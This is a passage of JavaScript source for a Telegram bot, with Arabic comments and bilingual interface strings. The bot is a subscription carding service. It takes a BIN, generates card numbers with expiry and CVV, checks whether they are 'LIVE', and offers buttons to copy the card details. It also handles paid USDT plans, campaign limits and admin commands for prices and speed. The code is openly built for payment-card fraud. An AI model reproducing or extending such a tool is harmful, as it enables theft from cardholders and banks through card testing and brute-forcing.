            while (bin.length < 6) bin += Math.floor(Math.random()*10);
            // حفظ BIN مؤقتاً وطلب عدد الفيزات لهذا BIN
            state.pendingBin = bin;
            state.step = 'awaiting_count_for_bin';
            await bot.sendMessage(chatId, `🔢 كم عدد الفيزات التي تريد تخمينها على BIN: ${bin}؟\n(الحد الأدنى 5، الحد الأقصى ${getSubscriber(chatId).cardsLimit})`);
        }
        return;
    }

    if (state && state.step === 'awaiting_count_for_bin') {
        const count = parseInt(text);
        if (isNaN(count)) {
            await bot.sendMessage(chatId, '⚠️ يرجى إرسال رقم صحيح.');
            return;
        }
        const subscriber = getSubscriber(chatId);
        const maxCards = subscriber.cardsLimit;
        if (!adminSet.has(chatId) && (count < 5 || count > maxCards)) {
            await bot.sendMessage(chatId, dict.count_out_of_range.replace('{max}', maxCards));
            const subsButton = { reply_markup: { inline_keyboard: [[{ text: '💎 عرض الاشتراكات', callback_data: 'menu_subscribe' }]] } };
            await bot.sendMessage(chatId, '⚠️ أنت في الخطة المجانية. قم بترقية خطتك لزيادة الحد الأقصى.', subsButton);
            return;
        }
        // إضافة BIN مع عدده إلى القائمة
        state.binsList.push({ bin: state.pendingBin, count: count });
        state.totalCards = count; // سيتم استخدام العدد الأخير لجميع BINs؟ حسب الطلب الأصلي كل BIN له عدد خاص، لكننا سنحتفظ بعدد لكل BIN
        delete state.pendingBin;
        await bot.sendMessage(chatId, `✅ تم إضافة BIN: ${state.binsList[state.binsList.length-1].bin} بعدد فيزات ${count}\nالحملات الحالية: ${state.binsList.length}`);
        // عرض أزرار: إضافة BIN آخر أو بدء التخمين
        const keyboard = {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '➕ إرسال BIN آخر', callback_data: 'add_another_bin' }],
                    [{ text: '🔒 قفل الحملة وبدأ التخمين', callback_data: 'lock_and_start' }],
                    [{ text: dict.cancel_btn, callback_data: 'cancel_guess' }]
                ]
            }
        };
        await bot.sendMessage(chatId, 'ماذا تريد أن تفعل؟', keyboard);
        state.step = 'awaiting_bin_decision';
        return;
    }

    // معالجة أوامر الأدمن النصية (تعديل الأسعار، السرعة، إضافة خطة، منح/إلغاء اشتراك)
    if (state && state.step === 'admin_edit_price') {
        const parts = text.split('=');
        if (parts.length !== 2) {
            await bot.sendMessage(chatId, 'صيغة غير صحيحة. استخدم: plan=price');
            return;
        }
        const planKey = parts[0].trim();
        const newPrice = parseFloat(parts[1].trim());
        if (isNaN(newPrice)) {
            await bot.sendMessage(chatId, 'السعر يجب أن يكون رقماً');
            return;
        }
        const plans = getPlans();
        if (!plans[planKey]) {
            await bot.sendMessage(chatId, `الخطة ${planKey} غير موجودة`);
            return;
        }
        plans[planKey].price = newPrice;
        updatePlans(plans);
        await bot.sendMessage(chatId, `✅ تم تحديث سعر خطة ${planKey} إلى ${newPrice} USDT`);
        guessState.delete(chatId);
        await showAdminPanel(chatId);
        return;
    }

    if (state && state.step === 'admin_edit_speed') {
        const parts = text.split('=');
        if (parts.length !== 2) {
            await bot.sendMessage(chatId, 'صيغة غير صحيحة. استخدم: plan=speed');
            return;
        }
        const planKey = parts[0].trim();
        const newSpeed = parseInt(parts[1].trim());
        if (isNaN(newSpeed) || newSpeed < 1 || newSpeed > 100) {
            await bot.sendMessage(chatId, 'السرعة يجب أن تكون رقماً بين 1 و 100');
            return;
        }
        const plans = getPlans();
        if (!plans[planKey]) {
            await bot.sendMessage(chatId, `الخطة ${planKey} غير موجودة`);
            return;
        }
        plans[planKey].speed = newSpeed;
        updatePlans(plans);
        await bot.sendMessage(chatId, `✅ تم تحديث سرعة خطة ${planKey} إلى ${newSpeed}%`);
        guessState.delete(chatId);
        await showAdminPanel(chatId);
        return;
    }

    if (state && state.step === 'admin_add_plan') {
        const parts = text.split('|');
        if (parts.length !== 6) {
            await bot.sendMessage(chatId, 'صيغة غير صحيحة. استخدم: name_ar|name_en|price|cardsLimit|campaignsLimit|speed');
            return;
        }
        const [nameAr, nameEn, price, cardsLimit, campaignsLimit, speed] = parts;
        const newPrice = parseFloat(price);
        const newCards = parseInt(cardsLimit);
        const newCamp = parseInt(campaignsLimit);
        const newSpeed = parseInt(speed);
        if (isNaN(newPrice) || isNaN(newCards) || isNaN(newCamp) || isNaN(newSpeed)) {
            await bot.sendMessage(chatId, 'السعر والحدود والسرعة يجب أن تكون أرقاماً');
            return;
        }
        const plans = getPlans();
        const newKey = nameEn.toLowerCase();
        plans[newKey] = { nameAr, nameEn, price: newPrice, cardsLimit: newCards, campaignsLimit: newCamp, speed: newSpeed };
        updatePlans(plans);
        await bot.sendMessage(chatId, `✅ تم إضافة خطة جديدة: ${nameAr} (${nameEn})`);
        guessState.delete(chatId);
        await showAdminPanel(chatId);
        return;
    }

    if (state && state.step === 'admin_grant') {
        const parts = text.split(' ');
        if (parts.length !== 2) {
            await bot.sendMessage(chatId, 'صيغة غير صحيحة. استخدم: user_id plan');
            return;
        }
        const userId = parseInt(parts[0]);
        const planKey = parts[1];
        const plans = getPlans();
        if (!plans[planKey]) {
            await bot.sendMessage(chatId, `الخطة ${planKey} غير موجودة`);
            return;
        }
        const end = new Date();
        end.setMonth(end.getMonth() + 1);
        updateSubscriber(userId, { plan: planKey, startDate: new Date().toISOString(), endDate: end.toISOString() });
        await bot.sendMessage(chatId, `✅ تم منح اشتراك ${planKey} للمستخدم ${userId}`);
        guessState.delete(chatId);
        await showAdminPanel(chatId);
        return;
    }

    if (state && state.step === 'admin_remove') {
        const userId = parseInt(text);
        if (isNaN(userId)) {
            await bot.sendMessage(chatId, 'يرجى إرسال معرف المستخدم الصحيح');
            return;
        }
        updateSubscriber(userId, { plan: 'free', startDate: new Date().toISOString(), endDate: new Date(Date.now() + 365*24*60*60*1000).toISOString() });
        await bot.sendMessage(chatId, `✅ تم إلغاء اشتراك المستخدم ${userId}`);
        guessState.delete(chatId);
        await showAdminPanel(chatId);
        return;
    }

    // فحص فيزا واحدة (إذا لم يكن هناك حالة نشطة)
    if (text && text.includes('|')) {
        await bot.sendMessage(chatId, dict.single_checking);
        const result = await checkSingleCard(text, chatId);
        if (result && result.isLive) {
            const flag = getFlag(result.country);
            const cardType = getCardType(text.split('|')[0]);
            const liveText = dict.live_result.replace('{card}',text).replace('{type}',cardType).replace('{country}',result.country).replace('{flag}',flag);
            const buttons = getCopyButtons(text, lang);
            await bot.sendMessage(chatId, liveText, { parse_mode: 'Markdown', ...buttons });
        }
        return;
    }
});

// ==========================================
// الترجمات الكاملة (عربي وإنجليزي)
// ==========================================
const translations = {
    ar: {
        choose_lang: 'اختر لغتك / Choose your language:',
        lang_changed: '✅ تم تغيير اللغة إلى العربية',
        main_menu: '✨ *القائمة الرئيسية* ✨\nاختر أحد الخيارين:',
        btn_guess: '🎲 تخمين مجموعة فيزات',
        btn_single: '🔍 فحص فيزا واحدة',
        btn_subscribe: '💎 الاشتراكات',
        btn_my_campaigns: '📋 حملاي النشطة',
        cancel_btn: '❌ إلغاء',
        btn_copy_full: '📋 نسخ الفيزا كاملة',
        btn_copy_num: '🔢 نسخ الرقم',
        btn_copy_exp: '📅 نسخ التاريخ',
        btn_copy_cvv: '🔐 نسخ CVV',
        enter_bin: '📌 أرسل الـ BIN الخاص بك (أول 6 أرقام أو أكثر)\nمثال: `62581`\nيمكنك إرسال عدة BINs',
        enter_count: '🔢 كم عدد الفيزات التي تريد تخمينها؟\n(الحد الأدنى 5، الحد الأقصى {max})',
        admin_unlimited: '\nللأدمن: لا يوجد حد أقصى.',
        count_out_of_range: '⚠️ العدد يجب أن يكون بين 5 و {max}.',
        cancel_msg: '❌ تم إلغاء العملية.',
        generating: '🔄 جاري إنشاء الفيزا {current}/{total} {dots}\n━━━━━━━━━━━━━━\n📌 BIN: {bin}',
        live_result: '✅ تعمل بنجاح ✅\n----------------------------------------\n\n💳    {card}\n\n📊 الحالة: تعمل ✅\n\n🏦 النوع: {type}\n\n🌍 البلد: {country} {flag}\n\n----------------------------------------\nبواسطة: @pe8bot',
        no_live_found: '😞 لم يتم العثور على أي بطاقة صالحة من أصل {total}.',
        new_campaign_btn: '🚀 بدأ حملة جديدة',
        summary: '📊 *الملخص النهائي*\n✅ الصالحة: {hit}\n🎯 المجموع: {total}',
        single_invalid: '📌 أرسل الفيزا كاملة بهذا التنسيق:\n`4111111111111111|01|2031|123`',
        single_checking: '⏳ جاري فحص البطاقة...',
        api_error: '⚠️ حدث خطأ أثناء الاتصال بالخدمة.',
        unknown: 'غير معروف',
        not_admin: '⛔ هذا الأمر للأدمن فقط.',
        subscription_plans: '💎 *خطط الاشتراك*\nاختر الخطة:',
        already_subscribed: '✅ أنت مشترك بالفعل في خطة {plan}.',
        upgrade_to_pro: '🚀 تطوير إلى Pro',
        upgrade_to_vip: '🚀 تطوير إلى VIP',
        upgrade_suggestion: 'يمكنك ترقية اشتراكك الآن:',
        subscribe_confirm: '✅ اخترت خطة {plan}\nقم بتحويل {amount} USDT إلى معرف بايننس:\n`{payId}`\nواكتب هذا الكود في الملاحظات:\n`{code}`\nثم أرسل صورة التحويل هنا.',
        payment_timeout: '⚠️ لم يتم إرسال صورة التحويل خلال 20 ثانية. يرجى إرسال صورة التحويل للتحقق من الدفعة.',
        payment_received: '📸 تم استلام الصورة. سيتم مراجعتها قريباً.',
        payment_approved: '🎉 تم تفعيل اشتراك {plan} بنجاح!',
        payment_rejected: '❌ تم رفض طلب الاشتراك.',
        campaigns_limit_reached: '⚠️ لقد وصلت للحد الأقصى للحملات المتزامنة ({limit}).',
        campaign_stopped: '🛑 تم إيقاف الحملة {id}.',
        no_active_campaigns: '⚠️ لا توجد حملات نشطة.',
        active_campaigns: '📋 *حملاي النشطة*\n'
    },
    en: {
        choose_lang: 'Choose your language / اختر لغتك:',
        lang_changed: '✅ Language changed to English',
        main_menu: '✨ *Main Menu* ✨\nChoose an option:',
        btn_guess: '🎲 Guess multiple cards',
        btn_single: '🔍 Check single card',
        btn_subscribe: '💎 Subscriptions',
        btn_my_campaigns: '📋 My active campaigns',
        cancel_btn: '❌ Cancel',
        btn_copy_full: '📋 Copy full card',
        btn_copy_num: '🔢 Copy number',
        btn_copy_exp: '📅 Copy expiry',
        btn_copy_cvv: '🔐 Copy CVV',
        enter_bin: '📌 Send your BIN (first 6 digits or more)\nExample: `62581`\nYou can send multiple BINs',
        enter_count: '🔢 How many cards to guess?\n(Min 5, Max {max})',
        admin_unlimited: '\nFor admin: no upper limit.',
        count_out_of_range: '⚠️ Count must be between 5 and {max}.',
        cancel_msg: '❌ Operation cancelled.',
        generating: '🔄 Generating card {current}/{total} {dots}\n━━━━━━━━━━━━━━\n📌 BIN: {bin}',
        live_result: '✅ LIVE ✅\n----------------------------------------\n\n💳    {card}\n\n📊 Status: LIVE ✅\n\n🏦 Type: {type}\n\n🌍 Country: {country} {flag}\n\n----------------------------------------\nBy: @pe8bot',
        no_live_found: '😞 No live cards found out of {total}.',
        new_campaign_btn: '🚀 Start new campaign',
        summary: '📊 *Final Summary*\n✅ Live: {hit}\n🎯 Total: {total}',
        single_invalid: '📌 Send the full card in this format:\n`4111111111111111|01|2031|123`',
        single_checking: '⏳ Checking card...',
        api_error: '⚠️ API error. Please try again later.',
        unknown: 'Unknown',
        not_admin: '⛔ This command is for admins only.',
        subscription_plans: '💎 *Subscription Plans*\nChoose your plan:',
        already_subscribed: '✅ You are already subscribed to {plan} plan.',
        upgrade_to_pro: '🚀 Upgrade to Pro',
        upgrade_to_vip: '🚀 Upgrade to VIP',
        upgrade_suggestion: 'You can upgrade your subscription now:',
        subscribe_confirm: '✅ You selected {plan} plan\nPlease send {amount} USDT to Binance ID:\n`{payId}`\nAnd write this code in the memo:\n`{code}`\nThen send the payment proof photo here.',
        payment_timeout: '⚠️ No payment proof received within 20 seconds. Please send the payment proof photo to verify.',
        payment_received: '📸 Payment proof received. It will be reviewed soon.',
        payment_approved: '🎉 Your {plan} subscription has been activated!',
        payment_rejected: '❌ Subscription request rejected.',
        campaigns_limit_reached: '⚠️ You have reached the maximum concurrent campaigns ({limit}).',
        campaign_stopped: '🛑 Campaign {id} stopped.',
        no_active_campaigns: '⚠️ No active campaigns.',
        active_campaigns: '📋 *Your active campaigns*\n'
    }
};

console.log('✅ البوت يعمل الآن بنظام متكامل مع إصلاح الأزرار وإضافة السرعة المتغيرة.');
